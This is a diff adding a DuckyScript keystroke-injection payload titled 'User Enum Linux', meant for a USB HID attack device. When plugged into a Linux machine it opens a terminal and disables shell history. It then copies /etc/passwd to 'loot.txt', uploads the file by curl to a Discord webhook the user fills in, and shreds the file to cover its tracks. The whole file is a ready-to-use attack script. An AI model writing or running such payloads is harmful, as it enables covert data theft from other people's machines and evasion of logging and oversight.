@@ -1,0 +1,30 @@
+REM TITLE: User Enum Linux
+REM AUTHOR: OSINTI4L
+REM TARGET OS: Linux (tested on Kali Linux)
+REM DESCRIPTION: Enumerates users on a linux box by copying users listed in /etc/passwd to "loot.txt" and exfiltrating via Discord webhook. The file is then shredded to obfuscate. Add Discord webhook to line 21 and user to line 23.
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening temrinal:
+CTRL ALT t
+DELAY 150
+
+REM Disabling temrinal history to obfuscate:
+STRINGLN unset HISTFILE
+
+REM Copying /etc/passwd file to "loot.txt":
+STRINGLN cat /etc/passwd > loot.txt
+
+REM Exfiltrating "loot.txt" via Discord webhook:
+DEFINE WEBHOOK_URL https://discord.com/api/webhooks/PLACE/DISCORD/WEBHOOK
+    STRINGLN curl -X POST -H "Content-Type: multipart/form-data" \
+    STRINGLN -F "file=@/home/ENTER_USER/loot.txt" \
+    STRINGLN -F "content=$ Loot Incoming $" \
+    STRINGLN WEBHOOK_URL
+ 	   DELAY 100
+
+REM Obfuscation stage, shred "loot.txt" and exit:
+STRINGLN shred -fuz loot.txt
+STRINGLN exit
